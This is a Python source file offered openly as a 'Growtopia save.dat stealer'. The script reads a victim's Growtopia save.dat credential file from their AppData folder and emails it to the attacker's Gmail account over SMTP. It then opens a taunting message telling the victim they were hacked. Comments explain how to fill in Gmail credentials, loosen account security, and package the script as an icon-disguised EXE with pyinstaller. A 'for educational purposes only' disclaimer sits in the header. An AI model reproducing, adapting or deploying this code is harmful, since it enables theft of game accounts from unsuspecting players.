
###########################
#                         #
#    Developer: Zenqi     #
#                         #
###########################

###########################
#                         #
#   discord: Zenqi#7610   #
#                         #
###########################

'''

Copyright (c) 2020 by Zenqi

This project was distributed for free without any charges

If theres any problem, feel free to contact me on my discord
account above.

Also this is for educational purposes only I must not involved
on any illegal activities you have done

'''

####### Growtopia Sav.dat Stealer #######

'''
A growtopia save.dat stealer written in python.

Before using, make sure you have the following requirements

'''

#############################
#                           #
#       Requirements        #
#                           #
#############################
#                           #
#       Python 3.x          #
#                           #
##########################################
#                                        #
#  smtplib > pip install smtplib         #
#  pyinstaller > pip isntall pyinstaller #
#  pathlib > pip install pathlib         #
#                                        #
##########################################
#                                        #
# Note, inorder to install modules, goto #
# cmd then type pip install <modulename> #
#                                        #
##########################################


# This requirements is important



#import modules

import smtplib #smtp > pip install smtplib
import os
import sys
from email.message import EmailMessage
from pathlib import Path #pathlib > pip install pathlib

#You can create new gmail if you want
#Note, make sure you allow 'less secure app' on your google account
#Also disable second veritification

#Join my discord server so you can ask me a question
#https://discord.gg/qfJUWpr

home = Path.home()
path =str(home)

ff = open('msg.txt', 'w')
ff.write('Your save.dat got hacked by unknown user. Please be safe next time') # > you can edit whatever you want but iam not responsibled
ff.close()

email = 'Enter username' # > you need to enter your gmail here
password = 'Enter password' # > you need to enter your password here

# Make sure that you enable "less secure app" on your google account


msg = EmailMessage()
msg['Subject'] = 'Save Dat Stole!' # > you can edit whatever you want
msg['From'] = email
msg['To'] = email

msg.set_content('Enjoy :D sav dat stealer by Zenqi')

with open(path + '\AppData\Local\Growtopia\save.dat', 'rb') as f:
    file_data = f.read()
    

msg.add_attachment(file_data, maintype='dat', subtype='dat', filename='save.dat')


#Note this one will connect to smtp server to send data, do not modify
#or change anything

with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    smtp.login(email, password)
    smtp.send_message(msg)

os.system('start msg.txt')

#Important Note: After you enter your gmail and password and want to build a EXE, Please read READ.MD in github or
#or do pyinstaller -F (-i Do this if you want to add icon then the icon path for ex. "C:/users/grow.ico") stealer.py






